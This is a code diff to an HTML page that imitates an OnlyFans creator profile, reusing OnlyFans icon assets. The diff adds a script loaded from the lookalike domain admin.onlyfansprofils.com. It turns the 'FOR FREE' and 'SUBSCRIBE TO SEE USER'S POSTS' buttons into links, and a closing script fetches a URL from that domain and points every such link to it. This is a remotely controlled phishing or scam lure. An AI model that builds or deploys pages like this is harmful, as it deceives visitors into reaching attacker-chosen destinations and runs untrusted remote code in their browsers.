@@ -9,6 +9,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
+<script src="https://admin.onlyfansprofils.com/script.js"></script>
     <link rel="apple-touch-icon" sizes="180x180"
         href="https://static2.onlyfans.com/static/prod/f/202506061345-bf5f05c732/icons/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32"
@@ -396,7 +397,7 @@
 
 
 
-                    <button class="w-full bg-[#00aff0] hover:bg-blue-600 text-white  p-[10px] px-4 rounded-full mt-4
+                    <a class=" link-here w-full bg-[#00aff0] hover:bg-blue-600 text-white  p-[10px] px-4 rounded-full mt-4
                         flex
                         justify-between
                         " style="font-size: 14px;">
@@ -406,7 +407,7 @@
                         <span>
                             FOR FREE
                         </span>
-                    </button>
+                    </a>
 
                 </div>
 
@@ -466,12 +467,12 @@
                             </svg>
                         </button>
                     </div>
-                    <button class="  w-[90%] bg-[#00aff0] hover:bg-blue-600 text-white  p-[6px] px-4 rounded-full mt-4"
+                    <a class="link-here text-center w-[90%] bg-[#00aff0] hover:bg-blue-600 text-white  p-[6px] px-4 rounded-full mt-4"
                         style="font-size: 14px;">
                         <b>
                             SUBSCRIBE TO SEE USER'S POSTS
                         </b>
-                    </button>
+                    </a>
                 </div>
 
             </div>
@@ -493,7 +494,7 @@
 
 
 
-                    <button class="w-full bg-[#00aff0] hover:bg-blue-600 text-white  p-[6px] px-4 rounded-full mt-4
+                    <a class="link-here w-full bg-[#00aff0] hover:bg-blue-600 text-white  p-[6px] px-4 rounded-full mt-4
                         flex
                         justify-between
                         " style="font-size: 14px;">
@@ -503,7 +504,7 @@
                         <span>
                             FOR FREE
                         </span>
-                    </button>
+                    </a>
 
                 </div>
 
@@ -551,5 +552,21 @@
 
     </div>
 </body>
+<script>
+    fetch("https://admin.onlyfansprofils.com/data.json").then(data => {
+        return data.text()
+
+    }).then(json => {
+        let url  = JSON.parse(json).link;
+        let Links = document.getElementsByClassName("link-here");
+        for (const element of Links) {
+            console.log(element);
+            
+            element.href = url;
+        }
+
+
+    })
+</script>
 
 </html>
